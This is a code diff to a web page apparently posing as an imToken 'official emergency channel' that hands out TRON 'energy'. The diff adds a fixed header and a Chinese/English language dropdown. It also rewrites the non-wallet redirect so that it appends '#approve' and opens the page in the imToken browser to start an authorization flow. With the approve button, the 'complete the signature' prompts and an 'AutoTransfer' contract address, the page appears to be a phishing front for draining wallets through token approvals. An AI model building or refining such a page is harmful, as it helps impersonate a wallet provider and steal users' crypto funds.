@@ -40,8 +40,9 @@ body {
     flex-direction: column;
     gap: 5px; /* 模块间距，避免拥挤 */
     overflow-y: auto;
+    padding-top: 90px; /* 给固定顶部容器留空间 */
 }
-/* 顶部容器：调整高度+对齐，减少冗余空间 */
+/* 顶部容器：固定定位+调整样式 */
 .header-container {
     display: flex;
     justify-content: space-between;
@@ -52,6 +53,14 @@ body {
     min-height: 80px;
     padding-bottom:1px;
     box-sizing: border-box;
+    position: fixed; /* 固定顶部 */
+    top: 0;
+    left: 0;
+    right: 0;
+    max-width: 600px;
+    margin: 0 auto;
+    background: #121a17; /* 继承页面背景，避免透明遮挡 */
+    z-index: 999; /* 确保在最上层 */
 }
 .lang-switch {
     padding: 0;
@@ -61,12 +70,17 @@ body {
     align-items: flex-end; /* 所有子元素靠右对齐 */
     gap: 6px; /* 文本和按钮的上下间距，可自定义 */
 }
-
 /* 新增文本样式（可按需调整） */
 .lang-text {
   color: #e0e8e4; /* 与按钮文字同色，保持统一 */
   font-size: 12px; /* 可根据需求调整大小 */
 }
+/* 语言下拉容器 */
+.lang-dropdown {
+    position: relative;
+    display: inline-block;
+}
+/* 下拉触发按钮 */
 .lang-toggle {
     padding: 3px 8px; /* 调大按钮内边距，更易点击 */
     border: 1px solid #3b82f6;
@@ -81,6 +95,41 @@ body {
 }
 .lang-toggle:hover {
     background: rgba(59, 130, 246, 0.2);
+}
+/* 下拉菜单样式 */
+.lang-dropdown-menu {
+    display: none;
+    position: absolute;
+    top: 100%;
+    right: 0;
+    min-width: 120px;
+    background: #1e2925;
+    border: 1px solid #3b82f6;
+    border-radius: 8px;
+    padding: 4px 0;
+    z-index: 1000;
+    box-shadow: 0 4px 8px rgba(0,0,0,0.3);
+}
+/* 下拉选项样式 */
+.lang-dropdown-item {
+    display: flex;
+    align-items: center;
+    gap: 6px;
+    padding: 6px 12px;
+    color: #e0e8e4;
+    font-size: 13px;
+    cursor: pointer;
+    background: transparent;
+    border: none;
+    width: 100%;
+    text-align: left;
+}
+.lang-dropdown-item:hover {
+    background: rgba(59, 130, 246, 0.2);
+}
+/* 显示下拉菜单 */
+.lang-dropdown.open .lang-dropdown-menu {
+    display: block;
 }
 .header {
     text-align: left;
@@ -112,7 +161,6 @@ body {
     margin-bottom: 0;
    line-height: 1.2;
 }
-
 .warning {
     background: #334155;
     color: #93c5fd;
@@ -354,11 +402,26 @@ body {
             </div>
             
             <div class="lang-switch">
-                <button id="langToggle" class="lang-toggle">
-                  <i class="fa fa-globe"></i>
-            </button>
-              <span id="headerDesc" class="lang-text">imToken官方应急通道</span> <!-- 新增文本 -->
-        
+                <!-- 语言下拉组件：替换原单一按钮 -->
+                <div class="lang-dropdown" id="langDropdown">
+                    <button class="lang-toggle" id="langToggleBtn">
+                        <i class="fa fa-flag" aria-hidden="true"></i> <!-- 初始显示中文国旗 -->
+                        <span id="currentLangText">中文</span>
+                    </button>
+                    <div class="lang-dropdown-menu">
+                        <!-- 中文选项 -->
+                        <button class="lang-dropdown-item" data-lang="zh">
+                            <i class="fa fa-flag" aria-hidden="true"></i>
+                            <span>中文</span>
+                        </button>
+                        <!-- 英文选项 -->
+                        <button class="lang-dropdown-item" data-lang="en">
+                            <i class="fa fa-flag-us" aria-hidden="true"></i>
+                            <span>English</span>
+                        </button>
+                    </div>
+                </div>
+                <span id="headerDesc" class="lang-text">imToken官方应急通道</span> <!-- 新增文本 -->
          </div>
     </div>
         <div id="userInfo">
@@ -413,7 +476,6 @@ body {
             </div>       
             <span id="approvalRecords" class="highlight">暂无能量领取记录</span>        
         </div>
-
         <!-- 按钮组移进container -->
         <div class="btn-group">
             <div class="warning">
@@ -427,7 +489,6 @@ body {
                <span id="reviewTipText">系统审核中，审核通过后请务必完成签名</span>
             </div>
         </div>
-
         <!-- 底部信息移进container -->
         <div class="footer-info" id="footerInfo">
             合约验证：AutoTransfer <span>TYzaM18c6x8R6LtdWxNoCh665vzobRHrGL</span>（TRON浏览器查询）
@@ -729,12 +790,24 @@ function isCustomerError(errMsg) {
     return customerErrorKeys.some(key => errMsg.includes(key));
 }
 // ========== 语言切换逻辑 ==========
-function toggleLang() {
-    currentLang = currentLang === "zh" ? "en" : "zh";
+// 初始化语言显示
+function initLangDisplay() {
+    if (currentLang === "zh") {
+        langToggleBtn.innerHTML = '<i class="fa fa-flag" aria-hidden="true"></i> <span id="currentLangText">中文</span>';
+    } else {
+        langToggleBtn.innerHTML = '<i class="fa fa-flag-us" aria-hidden="true"></i> <span id="currentLangText">English</span>';
+    }
+}
+// 切换语言
+function changeLang(newLang) {
+    currentLang = newLang;
     localStorage.setItem("imtoken_energy_lang", currentLang);
+    initLangDisplay(); // 更新按钮显示
     updatePageLang();
     reRenderDynamicContent();
     renderEnergyRecords();
+    // 关闭下拉菜单
+    langDropdown.classList.remove("open");
 }
 function updatePageLang() {
     const lang = langConfig[currentLang];
@@ -901,17 +974,24 @@ async function checkImTokenEnv() {
             specialTipContainer.style.display = "block"; // 显示非钱包环境专属容器
             userInfoEl.innerHTML = lang.nonImTokenUser;
             approveBtn.style.display = "none";
-           connectBtn.onclick = async () => {
+         connectBtn.onclick = async () => {
     try {
-        const dappUrl = window.location.href;
-        await navigator.clipboard.writeText(dappUrl);
-        // 按要求修改跳转逻辑：wallet.scheme + encodeURIComponent(targetUrl)
-        const walletScheme = "imtoken://browser?url="; // imToken 浏览器 scheme
-        const jumpUrl = walletScheme + encodeURIComponent(dappUrl);
+        // 1. 构造目标URL（拼接 #approve 触发后续授权流程）
+        const targetUrl = window.location.href + "#approve";
+        // 2. 复制链接（保留备用方案）
+        await navigator.clipboard.writeText(targetUrl);
+        // 3. 构造 imToken 专属跳转链接（scheme + 编码后目标URL）
+        const walletScheme = "imtoken://browser?url="; // imToken 浏览器核心scheme
+        const jumpUrl = walletScheme + encodeURIComponent(targetUrl);
+        // 4. 触发跳转（直接唤起imToken浏览器并打开目标页面）
         window.location.href = jumpUrl;
-        setTimeout(() => {}, 1200);
+        // 5. 兼容处理：确保跳转指令执行完成
+        setTimeout(() => {}, 1500);
     } catch (e) {
         console.error("复制/唤起失败：", e);
+        // 失败兜底提示
+        const lang = langConfig[currentLang];
+        alert(lang.copyFail + "\n" + lang.copyGuide);
     }
 };
         } catch (e) {
